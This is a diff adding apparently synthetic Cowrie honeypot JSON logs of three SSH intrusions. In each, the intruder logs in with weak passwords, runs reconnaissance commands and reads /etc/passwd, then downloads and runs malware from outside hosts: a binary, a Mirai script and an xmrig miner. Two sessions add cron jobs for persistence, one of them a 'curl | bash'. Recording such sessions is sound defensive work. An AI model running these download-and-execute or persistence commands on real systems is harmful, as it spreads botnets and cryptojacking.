@@ -1,0 +1,58 @@
+{"eventid":"cowrie.session.connect","src_ip":"45.227.255.207","src_port":36248,"dst_ip":"192.168.1.105","dst_port":2222,"session":"9fb997c72482","protocol":"ssh","timestamp":"2023-09-05T14:12:22.716370Z"}
+{"eventid":"cowrie.client.version","version":"SSH-2.0-libssh2_1.4.3","timestamp":"2023-09-05T14:12:23.072512Z","session":"9fb997c72482","src_ip":"45.227.255.207","src_port":36248}
+{"eventid":"cowrie.login.failed","timestamp":"2023-09-05T14:12:24.095232Z","session":"9fb997c72482","src_ip":"45.227.255.207","src_port":36248,"username":"root","password":"password","protocol":"ssh"}
+{"eventid":"cowrie.login.failed","timestamp":"2023-09-05T14:12:25.782311Z","session":"9fb997c72482","src_ip":"45.227.255.207","src_port":36248,"username":"root","password":"123456","protocol":"ssh"}
+{"eventid":"cowrie.login.failed","timestamp":"2023-09-05T14:12:27.475234Z","session":"9fb997c72482","src_ip":"45.227.255.207","src_port":36248,"username":"root","password":"admin","protocol":"ssh"}
+{"eventid":"cowrie.login.success","timestamp":"2023-09-05T14:12:29.150349Z","session":"9fb997c72482","src_ip":"45.227.255.207","src_port":36248,"username":"admin","password":"admin123","protocol":"ssh"}
+{"eventid":"cowrie.session.params","timestamp":"2023-09-05T14:12:29.150972Z","session":"9fb997c72482","arch":"linux-x64-lsb","src_ip":"45.227.255.207","src_port":36248}
+{"eventid":"cowrie.client.size","width":80,"height":24,"timestamp":"2023-09-05T14:12:29.152038Z","session":"9fb997c72482","src_ip":"45.227.255.207","src_port":36248}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T14:12:31.871293Z","session":"9fb997c72482","input":"uname -a","src_ip":"45.227.255.207","src_port":36248}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T14:12:35.543289Z","session":"9fb997c72482","input":"cat /proc/cpuinfo","src_ip":"45.227.255.207","src_port":36248}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T14:12:38.941235Z","session":"9fb997c72482","input":"free -m","src_ip":"45.227.255.207","src_port":36248}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T14:12:42.347853Z","session":"9fb997c72482","input":"cd /tmp","src_ip":"45.227.255.207","src_port":36248}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T14:12:47.641392Z","session":"9fb997c72482","input":"wget http://malware-server.cc/bins/x86_64","src_ip":"45.227.255.207","src_port":36248}
+{"eventid":"cowrie.session.file_download","timestamp":"2023-09-05T14:12:49.143198Z","session":"9fb997c72482","url":"http://malware-server.cc/bins/x86_64","outfile":"tmp/cowrie-downloaded-eecf4c59","shasum":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","src_ip":"45.227.255.207","src_port":36248}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T14:12:52.546321Z","session":"9fb997c72482","input":"chmod +x x86_64","src_ip":"45.227.255.207","src_port":36248}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T14:12:54.948123Z","session":"9fb997c72482","input":"./x86_64","src_ip":"45.227.255.207","src_port":36248}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T14:13:01.140962Z","session":"9fb997c72482","input":"ps aux","src_ip":"45.227.255.207","src_port":36248}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T14:13:05.551042Z","session":"9fb997c72482","input":"kill -9 $(ps aux | grep 'x86_64' | grep -v grep | awk '{print $2}')","src_ip":"45.227.255.207","src_port":36248}
+{"eventid":"cowrie.session.closed","timestamp":"2023-09-05T14:13:09.875234Z","session":"9fb997c72482","duration":47.158864,"src_ip":"45.227.255.207","src_port":36248}
+
+{"eventid":"cowrie.session.connect","src_ip":"193.142.146.40","src_port":33124,"dst_ip":"192.168.1.105","dst_port":2222,"session":"1a27f9c2ab41","protocol":"ssh","timestamp":"2023-09-05T15:24:35.610984Z"}
+{"eventid":"cowrie.client.version","version":"SSH-2.0-PUTTY","timestamp":"2023-09-05T15:24:36.091234Z","session":"1a27f9c2ab41","src_ip":"193.142.146.40","src_port":33124}
+{"eventid":"cowrie.login.success","timestamp":"2023-09-05T15:24:42.523409Z","session":"1a27f9c2ab41","src_ip":"193.142.146.40","src_port":33124,"username":"oracle","password":"oracle","protocol":"ssh"}
+{"eventid":"cowrie.session.params","timestamp":"2023-09-05T15:24:42.523967Z","session":"1a27f9c2ab41","arch":"linux-x64-lsb","src_ip":"193.142.146.40","src_port":33124}
+{"eventid":"cowrie.client.size","width":80,"height":24,"timestamp":"2023-09-05T15:24:42.525012Z","session":"1a27f9c2ab41","src_ip":"193.142.146.40","src_port":33124}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T15:24:45.674321Z","session":"1a27f9c2ab41","input":"id","src_ip":"193.142.146.40","src_port":33124}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T15:24:49.341893Z","session":"1a27f9c2ab41","input":"cat /etc/passwd","src_ip":"193.142.146.40","src_port":33124}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T15:24:53.129764Z","session":"1a27f9c2ab41","input":"ls -la /var/log","src_ip":"193.142.146.40","src_port":33124}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T15:24:58.416439Z","session":"1a27f9c2ab41","input":"cd /var/tmp","src_ip":"193.142.146.40","src_port":33124}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T15:25:01.840192Z","session":"1a27f9c2ab41","input":"curl -o mirai.sh http://malware-load.net/tools/mirai.sh","src_ip":"193.142.146.40","src_port":33124}
+{"eventid":"cowrie.session.file_download","timestamp":"2023-09-05T15:25:03.342874Z","session":"1a27f9c2ab41","url":"http://malware-load.net/tools/mirai.sh","outfile":"tmp/cowrie-downloaded-f53a72b1","shasum":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","src_ip":"193.142.146.40","src_port":33124}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T15:25:06.764321Z","session":"1a27f9c2ab41","input":"chmod +x mirai.sh","src_ip":"193.142.146.40","src_port":33124}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T15:25:09.127651Z","session":"1a27f9c2ab41","input":"bash mirai.sh","src_ip":"193.142.146.40","src_port":33124}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T15:25:15.873254Z","session":"1a27f9c2ab41","input":"crontab -l","src_ip":"193.142.146.40","src_port":33124}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T15:25:21.345221Z","session":"1a27f9c2ab41","input":"echo '*/10 * * * * curl -s http://malware-load.net/tools/update.sh | bash > /dev/null 2>&1' | crontab -","src_ip":"193.142.146.40","src_port":33124}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T15:25:25.876542Z","session":"1a27f9c2ab41","input":"crontab -l","src_ip":"193.142.146.40","src_port":33124}
+{"eventid":"cowrie.session.closed","timestamp":"2023-09-05T15:25:32.456789Z","session":"1a27f9c2ab41","duration":56.845805,"src_ip":"193.142.146.40","src_port":33124}
+
+{"eventid":"cowrie.session.connect","src_ip":"118.193.55.182","src_port":50492,"dst_ip":"192.168.1.105","dst_port":2222,"session":"5ad3e7f41c98","protocol":"ssh","timestamp":"2023-09-05T17:42:14.234567Z"}
+{"eventid":"cowrie.client.version","version":"SSH-2.0-libssh-0.6.0","timestamp":"2023-09-05T17:42:14.654321Z","session":"5ad3e7f41c98","src_ip":"118.193.55.182","src_port":50492}
+{"eventid":"cowrie.login.success","timestamp":"2023-09-05T17:42:18.765432Z","session":"5ad3e7f41c98","src_ip":"118.193.55.182","src_port":50492,"username":"user","password":"12345","protocol":"ssh"}
+{"eventid":"cowrie.session.params","timestamp":"2023-09-05T17:42:18.765987Z","session":"5ad3e7f41c98","arch":"linux-x64-lsb","src_ip":"118.193.55.182","src_port":50492}
+{"eventid":"cowrie.client.size","width":80,"height":24,"timestamp":"2023-09-05T17:42:18.767012Z","session":"5ad3e7f41c98","src_ip":"118.193.55.182","src_port":50492}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T17:42:21.874321Z","session":"5ad3e7f41c98","input":"cat /proc/version","src_ip":"118.193.55.182","src_port":50492}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T17:42:26.341893Z","session":"5ad3e7f41c98","input":"lscpu","src_ip":"118.193.55.182","src_port":50492}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T17:42:30.129764Z","session":"5ad3e7f41c98","input":"cat /etc/os-release","src_ip":"118.193.55.182","src_port":50492}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T17:42:35.416439Z","session":"5ad3e7f41c98","input":"mkdir -p .hidden","src_ip":"118.193.55.182","src_port":50492}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T17:42:39.840192Z","session":"5ad3e7f41c98","input":"cd .hidden","src_ip":"118.193.55.182","src_port":50492}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T17:42:43.876542Z","session":"5ad3e7f41c98","input":"wget -q http://193.142.30.233/xmr/config.json","src_ip":"118.193.55.182","src_port":50492}
+{"eventid":"cowrie.session.file_download","timestamp":"2023-09-05T17:42:45.342874Z","session":"5ad3e7f41c98","url":"http://193.142.30.233/xmr/config.json","outfile":"tmp/cowrie-downloaded-789a23f1","shasum":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","src_ip":"118.193.55.182","src_port":50492}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T17:42:48.764321Z","session":"5ad3e7f41c98","input":"wget -q http://193.142.30.233/xmr/xmrig","src_ip":"118.193.55.182","src_port":50492}
+{"eventid":"cowrie.session.file_download","timestamp":"2023-09-05T17:42:51.127651Z","session":"5ad3e7f41c98","url":"http://193.142.30.233/xmr/xmrig","outfile":"tmp/cowrie-downloaded-098f4d3a","shasum":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","src_ip":"118.193.55.182","src_port":50492}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T17:42:54.873254Z","session":"5ad3e7f41c98","input":"chmod +x xmrig","src_ip":"118.193.55.182","src_port":50492}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T17:42:58.345221Z","session":"5ad3e7f41c98","input":"nohup ./xmrig -c config.json > /dev/null 2>&1 &","src_ip":"118.193.55.182","src_port":50492}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T17:43:02.345678Z","session":"5ad3e7f41c98","input":"ps aux | grep xmrig","src_ip":"118.193.55.182","src_port":50492}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T17:43:07.234567Z","session":"5ad3e7f41c98","input":"ls -la","src_ip":"118.193.55.182","src_port":50492}
+{"eventid":"cowrie.command.input","timestamp":"2023-09-05T17:43:12.987654Z","session":"5ad3e7f41c98","input":"echo '*/15 * * * * cd $HOME/.hidden && ./xmrig -c config.json > /dev/null 2>&1' | crontab -","src_ip":"118.193.55.182","src_port":50492}
+{"eventid":"cowrie.session.closed","timestamp":"2023-09-05T17:43:18.456789Z","session":"5ad3e7f41c98","duration":64.222222,"src_ip":"118.193.55.182","src_port":50492}
